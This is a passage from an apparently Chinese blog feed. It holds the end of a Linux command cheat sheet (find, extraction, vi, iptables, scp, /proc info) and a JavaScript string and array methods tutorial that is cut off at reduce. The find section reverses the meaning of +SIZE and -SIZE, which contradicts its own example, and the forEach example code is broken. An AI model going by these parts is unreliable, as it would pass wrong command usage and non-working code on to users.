class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find [PATH] [option] [action]</span><br></pre></td></tr></table></figure><p><strong>find参数：基于文件名的搜索</strong></p><ul><li>与文件名有关的参数如下<ul><li><code>-name filename</code>：查找文件名为<code>filename</code>的文件。<code>filename</code>可使用正则表达式表示</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~] # find / -name passwd</span><br></pre></td></tr></table></figure><p>查找文件名为<code>passwd</code>的文件</p><p><strong>find参数：基于文件大小的搜索</strong></p><ul><li>与文件大小有关的参数如下<ul><li><code>-size SIZE</code>：查找文件大小刚好等于SIZE的文件</li><li><code>-size -SIZE</code>：查找文件大小大于SIZE的文件</li><li><code>-size +SIZE</code>：查找文件大小小于SIZE的文件</li></ul></li></ul><blockquote><p>其中，SIZE的单位有</p></blockquote><ul><li><code>c</code> —— <code>byte</code>，字节；</li><li><code>w</code> —— 字（2字节）；</li><li><code>b</code> —— <code>bit</code>，块（512字节）；</li><li><code>k</code> —— 千字节；</li><li><code>M</code> —— 兆字节；</li><li><code>G</code> —— 吉字节</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~] <span class="comment"># find . -type f -size +10k</span></span><br><span class="line">搜索大于10KB的文件</span><br><span class="line">[root@www ~] <span class="comment"># find . -type f -size 10k</span></span><br><span class="line">搜索等于10KB的文件</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><ul><li>通常<code>find</code>不很常用，因为速度慢！</li><li>通常都是先使用<code>whereis</code>或者<code>locate</code>来检查，当真的找不到了，才用<code>find</code>查找</li></ul><h2 id="三、压缩解压命令"><a href="#三、压缩解压命令" class="headerlink" title="三、压缩解压命令"></a>三、压缩解压命令</h2><ul><li><code>*.tar</code> 用 <code>tar -xvf</code> 解压</li><li><code>*.gz</code> 用 <code>gzip -d</code>或者<code>gunzip</code> 解压</li><li><code>*.tar.gz</code>和<code>*.tgz</code> 用 <code>tar -xzf</code> 解压</li><li><code>*.bz2</code> 用<code>bzip2 -d</code>或者用<code>bunzip2</code> 解压</li><li><code>*.tar.bz2</code>用<code>tar -xjf</code> 解压</li><li><code>*.Z</code> 用 <code>uncompress</code> 解压</li><li><code>*.tar.Z</code> 用<code>tar -xZf</code> 解压</li><li><code>*.rar</code> 用 <code>unrar e</code>解压</li><li><code>*.zip</code> 用 <code>unzip</code> 解压</li></ul><h2 id="四、VI相关"><a href="#四、VI相关" class="headerlink" title="四、VI相关"></a>四、VI相关</h2><ul><li>定位到头尾 <ul><li><code>G</code> 定位到尾</li><li><code>1G</code> 定位到头</li><li><code>nG</code> 定位到指定行</li></ul></li><li>复制<ul><li>复制一行 <ul><li><code>yy</code> 复制当前行</li></ul></li><li>复制多行<ul><li><code>7yy</code> 从当前行开始复制<code>７</code>行</li></ul></li><li>复制当前到行尾的内容 <ul><li><code>y$</code></li></ul></li></ul></li><li>粘贴<ul><li><code>p</code> </li><li>大写<code>P</code>代表贴至游标前</li></ul></li><li>选择复制<ul><li><code>v</code>进入可视化</li></ul></li><li>删除<ul><li>删除一行<ul><li><code>dd</code></li></ul></li><li>剪切至行首 <ul><li><code>d^</code></li></ul></li><li>剪切至行尾 <ul><li><code>d$</code></li></ul></li></ul></li><li>搜索 <code>/</code>搜索的关键字，按<code>n</code>切换下一个关键字</li></ul><h2 id="五、磁盘管理"><a href="#五、磁盘管理" class="headerlink" title="五、磁盘管理"></a>五、磁盘管理</h2><ul><li>查看内存使用情况： <code>free -m</code>  (<code>m</code>为<code>MB</code>，<code>g</code>为<code>GB</code>)</li><li>查看对应磁盘使用情况： <code>df -h</code></li></ul><h2 id="六、进程管理"><a href="#六、进程管理" class="headerlink" title="六、进程管理"></a>六、进程管理</h2><ul><li><code>pkill</code>  根据进程名杀死进程</li><li><code>ps</code> 列出系统中运行的进程，包括进程号、命令、CPU使用量、内存使用量<ul><li><code>ps -a</code> 列出所有运行中/激活进程</li><li><code>ps -ef |grep processName</code> 列出需要进程</li><li><code>ps -aux</code> 显示进程信息</li></ul></li><li><code>pstree</code> <code>linux</code>中，每一个进程都是由其父进程创建的。此命令以可视化方式显示进程，通过显示进程的树状图来展示进程间关系</li><li><code>top</code> <ul><li>可以监视系统中不同的进程所使用的资源</li><li>显示进程的数据包括<code>PID</code>、进程属主、优先级、<code>%CPU</code>、<code>%memory</code>等。可以使用这些显示指示出资源使用量</li></ul></li></ul><h2 id="七、网络管理"><a href="#七、网络管理" class="headerlink" title="七、网络管理"></a>七、网络管理</h2><p><strong>7.1 下载源管理</strong></p><ul><li><code>yum list | grep nginx</code> 查看是否有<code>Nginx</code>源</li></ul><p><strong>7.2 防火墙相关</strong></p><blockquote><p><code>linux</code>查看防火墙状态及开启关闭命令</p></blockquote><ul><li><strong>service方式</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看防火墙状态</span></span><br><span class="line"></span><br><span class="line">[root@centos6 ~]<span class="comment"># service iptables status</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启防火墙</span></span><br><span class="line"></span><br><span class="line">[root@centos6 ~]<span class="comment"># service iptables start</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭防火墙</span></span><br><span class="line">[root@centos6 ~]<span class="comment"># service iptables stop</span></span><br></pre></td></tr></table></figure><p><strong>iptables方式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@centos6 ~]<span class="comment"># cd /etc/init.d/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">[root@centos6 init.d]<span class="comment"># /etc/init.d/iptables status</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂时关闭防火墙 </span></span><br><span class="line">[root@centos6 init.d]<span class="comment"># /etc/init.d/iptables stop</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># iptables</span></span><br><span class="line">[root@centos6 init.d]<span class="comment"># /etc/init.d/iptables restart</span></span><br></pre></td></tr></table></figure><ul><li><code>linux</code>的防火墙是否阻止80端口<ul><li>返回有内容说明开通，没返回内容，则说明阻止</li><li><code>iptables -vnL | grep &quot;:80 &quot;</code></li></ul></li></ul><h2 id="八、上传文件相关"><a href="#八、上传文件相关" class="headerlink" title="八、上传文件相关"></a>八、上传文件相关</h2><ul><li>从远处复制文件到本地目录 <ul><li><code>scp root@10.10.10.10:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/</code></li></ul></li><li>上传本地目录到远程机器指定目录(拷贝目录带上<code>-r</code>,递归复制)<ul><li><code>scp -r /opt/soft/mongodb root@10.10.10.10:/opt/soft/scptest</code></li></ul></li></ul><h2 id="九、系统相关"><a href="#九、系统相关" class="headerlink" title="九、系统相关"></a>九、系统相关</h2><p><strong>9.1 CPU管理</strong></p><ul><li>查看对应CPU使用情况<ul><li><code>cat /proc/cpuinfo</code></li></ul></li><li>只显示一行对应的CPU型号以及其他信息 <ul><li><code>cat  /proc/cpuinfo | grep &quot;model name&quot; | head -1</code></li></ul></li><li>系统有几个核就会显示几行<ul><li><code>cat  /proc/cpuinfo | grep &quot;model name&quot;</code></li></ul></li><li>统计出一共有多少核<ul><li><code>cat  /proc/cpuinfo | grep &quot;model name&quot; | wc -l</code></li></ul></li></ul><p><strong>9.2其他</strong></p><ul><li>查看对应服务器版本当前操作系统发行版信息<ul><li><code>cat /etc/issue</code>  或  <code>cat /etc/redhat-release</code></li></ul></li><li>查看更为底层的版本信息： <code>cat /proc/version</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、文件管理&quot;&gt;&lt;a href=&quot;#一、文件管理&quot; class=&quot;headerlink&quot; title=&quot;一、文件管理&quot;&gt;&lt;/a&gt;一、文件管理&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1.1 创建删除文件&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mkdir&lt;/
      
    
    </summary>
    
      <category term="Back-end" scheme="http://blog.poetries.top/categories/Back-end/"/>
    
    
      <category term="Linux" scheme="http://blog.poetries.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript数组、字符串、对象常用方法</title>
    <link href="http://blog.poetries.top/2018/02/23/js-string-arr-object-api/"/>
    <id>http://blog.poetries.top/2018/02/23/js-string-arr-object-api/</id>
    <published>2018-02-23T07:10:12.000Z</published>
    <updated>2018-04-10T03:33:13.991Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、String对象"><a href="#一、String对象" class="headerlink" title="一、String对象"></a>一、String对象</h2><h3 id="1-1-slice"><a href="#1-1-slice" class="headerlink" title="1.1 slice"></a>1.1 slice</h3><ul><li><code>stringObject.slice(start, end)</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">'Hello world!'</span>;</span><br><span class="line"><span class="keyword">var</span> b = a.slice(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> c = a.slice(<span class="number">-4</span>, <span class="number">-2</span>);</span><br><span class="line"><span class="comment">// a: 'Hello world!'</span></span><br><span class="line"><span class="comment">// b: 'llo world!'</span></span><br><span class="line"><span class="comment">// c: 'rl'，参数可为负</span></span><br></pre></td></tr></table></figure><h3 id="1-2-substr"><a href="#1-2-substr" class="headerlink" title="1.2 substr"></a>1.2 substr</h3><ul><li><code>stringObject.substr(start, length)</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">'Hello world!'</span>;</span><br><span class="line"><span class="keyword">var</span> b = a.substr(<span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">var</span> c = a.substr(<span class="number">-5</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// a: 'Hello world!'</span></span><br><span class="line"><span class="comment">// b: 'Hell'</span></span><br><span class="line"><span class="comment">// c: 'or'，参数可为负</span></span><br></pre></td></tr></table></figure><h3 id="1-3-substring"><a href="#1-3-substring" class="headerlink" title="1.3 substring"></a>1.3 substring</h3><ul><li><code>stringObject.substring(start, stop)</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">'Hello world!'</span>;</span><br><span class="line"><span class="keyword">var</span> b = a.substring(<span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">var</span> c = a.substring(<span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> d = a.substring(<span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line"><span class="comment">// a: 'Hello world!'</span></span><br><span class="line"><span class="comment">// b: 'Hell'</span></span><br><span class="line"><span class="comment">// c: 'l'，start比stop小，交换这两个参数</span></span><br><span class="line"><span class="comment">// d: ''，参数为负，返回空字符串</span></span><br></pre></td></tr></table></figure><blockquote><p><code>slice</code>、<code>substr</code>、<code>substring</code>都是字符串的切割方法，三者之间有细微的区别，根据不同的使用场景可以灵活使用。三种方法都是生成新的字符串，而不是修改原<code>string</code></p></blockquote><h2 id="二、Array对象"><a href="#二、Array对象" class="headerlink" title="二、Array对象"></a>二、Array对象</h2><h3 id="2-1-concat"><a href="#2-1-concat" class="headerlink" title="2.1 concat"></a>2.1 concat</h3><ul><li>参数可以为具体的值，也可以为数组对象，可以任意多个。不改变现有的数组，返回被连接数组的一个副本。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = a.concat(<span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">var</span> c = a.concat([<span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"><span class="comment">// a: [1, 2, 3]</span></span><br><span class="line"><span class="comment">// b: [1, 2, 3, 4, 5]</span></span><br><span class="line"><span class="comment">// c: [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><h3 id="2-2-pop"><a href="#2-2-pop" class="headerlink" title="2.2 pop"></a>2.2 pop</h3><ul><li>删除 <code>arrayObject</code> 的最后一个元素，把数组长度减 <code>1</code>，并且返回它删除的元素的值。如果数组已经为空，则 pop() 不改变数组，并返回 <code>undefined</code> 值。该方法会改变原数组</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = a.pop();</span><br><span class="line"><span class="comment">// a: [1, 2]，修改了原数组</span></span><br><span class="line"><span class="comment">// b: 3，返回删除元素的值</span></span><br></pre></td></tr></table></figure><h3 id="2-3-push"><a href="#2-3-push" class="headerlink" title="2.3 push"></a>2.3 push</h3><ul><li>参数顺序添加到 <code>arrayObject</code> 的尾部，直接修改<code>arrayObject</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = a.push(<span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"><span class="comment">// a: [1, 2, 3, 4, 5]，修改了原数组</span></span><br><span class="line"><span class="comment">// b: 5，返回修改后的数组的长度</span></span><br></pre></td></tr></table></figure><h3 id="2-4-shift"><a href="#2-4-shift" class="headerlink" title="2.4 shift"></a>2.4 shift</h3><ul><li>把数组的第一个元素从其中删除，并返回第一个元素的值。如果数组是空的，那么 <code>shift()</code> 方法将不进行任何操作，返回<code>undefined</code>值。该方法会改变原数组。类比<code>pop</code>方法</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = a.shift();</span><br><span class="line"><span class="comment">// a: [2, 3]，修改了原数组</span></span><br><span class="line"><span class="comment">// b: 1，返回删除元素的值</span></span><br></pre></td></tr></table></figure><h3 id="2-5-unshift"><a href="#2-5-unshift" class="headerlink" title="2.5 unshift"></a>2.5 unshift</h3><ul><li>向数组的开头添加一个或更多元素，并返回新的长度。该方法的第一个参数将成为数组的新元素 <code>0</code>，如果还有第二个参数，它将成为新的元素 <code>1</code>，以此类推</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = a.unshift(<span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"><span class="comment">// a: [ 4, 5, 1, 2, 3 ]，修改了原数组</span></span><br><span class="line"><span class="comment">// b: 5，返回修改后的数组的长度</span></span><br></pre></td></tr></table></figure><h3 id="2-6-slice"><a href="#2-6-slice" class="headerlink" title="2.6 slice"></a>2.6 slice</h3><ul><li>返回一个新的数组，包含从 <code>start</code> 到 <code>end</code> （不包括该元素）的 <code>arrayObject</code> 中的元素。该方法不会修改原数组</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> b = a.slice(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// a: [1, 2, 3, 4, 5]，不修改原数组</span></span><br><span class="line"><span class="comment">// b: [3, 4, 5]，返回新数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> d = c.slice(<span class="number">2</span>, <span class="number">-1</span>);</span><br><span class="line"><span class="comment">// c: [1, 2, 3, 4, 5]，不修改原数组</span></span><br><span class="line"><span class="comment">// d: [3, 4]，返回新数组</span></span><br></pre></td></tr></table></figure><h3 id="2-7-splice"><a href="#2-7-splice" class="headerlink" title="2.7 splice"></a>2.7 splice</h3><ul><li>可删除从 <code>index</code> 处开始的零个或多个元素，并且用参数列表中声明的一个或多个值来替换那些被删除的元素。如果从 <code>arrayObject</code> 中删除了元素，则返回的是含有被删除的元素的数组。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> b = a.splice(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// a: [1, 3, 4, 5]，修改了原数组</span></span><br><span class="line"><span class="comment">// b: [2]，返回新数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> d = c.splice(<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// c: [1, 2, 3, 4]，修改了原数组</span></span><br><span class="line"><span class="comment">// d: [5]，返回新数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> e = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> f = e.splice(<span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>);</span><br><span class="line"><span class="comment">// e: [ 1, 6, 7, 3, 4, 5 ]，修改了原数组</span></span><br><span class="line"><span class="comment">// f: [2]，返回新数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> h = g.splice(<span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"><span class="comment">// g: [ 1, 8, 2, 3, 4, 5 ]，修改了原数组</span></span><br><span class="line"><span class="comment">// h: []，没有删除值，返回空数组</span></span><br></pre></td></tr></table></figure><h3 id="2-8-sort"><a href="#2-8-sort" class="headerlink" title="2.8 sort"></a>2.8 sort</h3><ul><li>无参数时，将按字母顺序对数组中的元素进行排序。参数为比较函数时，如果要交换<code>prev</code>和<code>next</code>的值，返回大于<code>0</code>的值</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">9</span>];</span><br><span class="line"><span class="keyword">var</span> b = a.sort(<span class="function"><span class="keyword">function</span> (<span class="params">prev, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> prev - next;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// a: [1, 6, 8, 9, 10]，修改了原数组</span></span><br><span class="line"><span class="comment">// b: [1, 6, 8, 9, 10]，返回修改后的数组</span></span><br></pre></td></tr></table></figure><h3 id="2-9-reverse"><a href="#2-9-reverse" class="headerlink" title="2.9 reverse"></a>2.9 reverse</h3><ul><li>用于颠倒数组中元素的顺序。会改变原数组</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = a.reverse();</span><br><span class="line"><span class="comment">// a: [3, 2, 1]，修改了原数组</span></span><br><span class="line"><span class="comment">// b: [3, 2, 1]，返回修改后的数组</span></span><br></pre></td></tr></table></figure><h3 id="2-10-map"><a href="#2-10-map" class="headerlink" title="2.10 map"></a>2.10 map</h3><blockquote><p>有返回值，返回一个新的数组，每个元素为调用<code>func</code>的结果</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">let</span> other = list.map(<span class="function">(<span class="params">d, i</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> d * <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(other);</span><br><span class="line"><span class="comment">// print: [2, 4, 6, 8, 10]</span></span><br></pre></td></tr></table></figure><h3 id="2-11-forEach"><a href="#2-11-forEach" class="headerlink" title="2.11 forEach"></a>2.11 forEach</h3><ul><li>数组的每个元素执行一次提供的函数。一般来说不修改原数组，但也可以通过处理函数修改原数组。该方法很灵活，可类比<code>for...of</code></li><li>没有返回值，只针对每个元素调用<code>func</code>。</li><li>优点：代码简介。</li><li>缺点：无法使用<code>break</code>，<code>return</code>等终止循环</li></ul><blockquote><ul><li><code>value</code> 当前操作的数组元素</li><li>当前操作元素的数组索引</li><li><code>array</code> 当前数组的引用</li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">list.forEach(<span class="function">(<span class="params">d, i</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.push(d * <span class="number">2</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(other);</span><br><span class="line"><span class="comment">// print: [2, 4, 6, 8, 10]</span></span><br></pre></td></tr></table></figure><h3 id="2-12-find"><a href="#2-12-find" class="headerlink" title="2.12 find"></a>2.12 find</h3><ul><li>返回数组中<strong>第一个满足测试条件</strong>（返回<code>true</code>）的元素。如果不存在这样的元素，返回<code>undefined</code>。<code>findIndex</code>类似，只不过返回的是第一个满足测试条件的元素的<code>index</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = a.find(<span class="function">(<span class="params">curVal</span>) =&gt;</span> curVal === <span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> c = a.find(<span class="function">(<span class="params">curVal</span>) =&gt;</span> curVal === <span class="number">4</span>);</span><br><span class="line"><span class="comment">// a: [1, 2, 3]，不修改原数组</span></span><br><span class="line"><span class="comment">// b: 1</span></span><br><span class="line"><span class="comment">// c: undefined</span></span><br></pre></td></tr></table></figure><h3 id="2-13-filter"><a href="#2-13-filter" class="headerlink" title="2.13 filter"></a>2.13 filter</h3><ul><li>返回数组中<strong>所有满足测试条件</strong>（返回<code>true</code>）的元素组成的数组。如果不存在这样的元素，返回<code>[]</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = a.filter(<span class="function">(<span class="params">curVal</span>) =&gt;</span> curVal &gt; <span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> c = a.filter(<span class="function">(<span class="params">curVal</span>) =&gt;</span> curVal &gt; <span class="number">3</span>);</span><br><span class="line"><span class="comment">// a: [1, 2, 3]，不修改原数组</span></span><br><span class="line"><span class="comment">// b: [2, 3]</span></span><br><span class="line"><span class="comment">// c: []</span></span><br></pre></td></tr></table></figure><h3 id="2-14-reduce和reduceRight"><a href="#2-14-reduce和reduceRight" class="headerlink" title="2.14 reduce和reduceRight"></a>2.14 reduce和reduceRight</h3><blockquote><p><code>.reduce</code>从左到右而<code>.reduceRight</code>从右到左循环遍历数组，每次调用接收目前为止的部分结果和当前遍历的值</p></blockquote><ul><li>两种方法都有如下典型用法：<code>.reduce(callback(previousValue, currentValue, index, array), initialValue)</code>。</li><li><code>previousValue</code>是最后被调用的回调函数的返回值，<code>initialValue</code>是开始时<code>previousValue</code>被初始化的值。<code>currentValue</code></li><li>是当前被遍历的元素值，<code>index</code>是当前元素在数组中的索引值。<code>array</code>是对调用<code>.reduce</code>数组的简单引用</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.sum = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">partial, value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> partial + value</span><br><span class="line">    &#125;, <span class="number">0</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">10</span>].sum()</span><br><span class="line"><span class="comment">// &lt;- 28</span></span><br></pre></td></tr></table></figure><blockquote><p>可以使用<code>.reduce</code>作为对象的字符串生成器</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">concat</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> input.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">partial, value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (partial) &#123;</span><br><span class="line">            partial += <span class="string">', '</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> partial + value</span><br><span class="line">    &#125;, <span class="string">''</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">concat([</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">'George'</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">'Sam'</span> &#125;,</span><br><span class="line">    &#123; <span 